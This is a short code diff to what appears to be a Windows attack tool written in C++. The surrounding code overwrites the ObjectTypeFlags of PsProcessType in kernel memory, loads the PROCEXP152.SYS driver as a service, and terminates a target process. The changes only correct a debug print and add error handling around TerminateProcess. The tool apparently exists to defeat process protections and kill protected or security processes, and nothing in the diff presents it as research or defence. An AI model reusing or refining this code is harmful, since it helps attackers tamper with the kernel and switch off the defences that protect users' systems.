@@ -59,7 +59,7 @@ int main(int argc,const char *argv[]){
         kernel.WriteMemoryWORD(PsProcessTypeFlags, NewObjectTypeFlags);
         NewObjectTypeFlags = kernel.ReadMemoryWORD(PsProcessTypeFlags);
 
-        printf("New ObjectTypeFlags: 0x%x\n", ObjectTypeFlags);
+        printf("New ObjectTypeFlags: 0x%x\n", NewObjectTypeFlags);
 
         sysPath = std::wstring(path) + L"\\PROCEXP152.SYS";
         serviceName = L"PROCEXP152";
@@ -88,7 +88,9 @@ int main(int argc,const char *argv[]){
                 }
             }
             if (hProcess != nullptr) {
-                TerminateProcess(hProcess, 0);
+                bool success = TerminateProcess(hProcess, 0);
+                if (!success)
+                    printf("TernimateProcess failed: %d\n", GetLastError());
                 ::CloseHandle(hProcess);
             }
         }
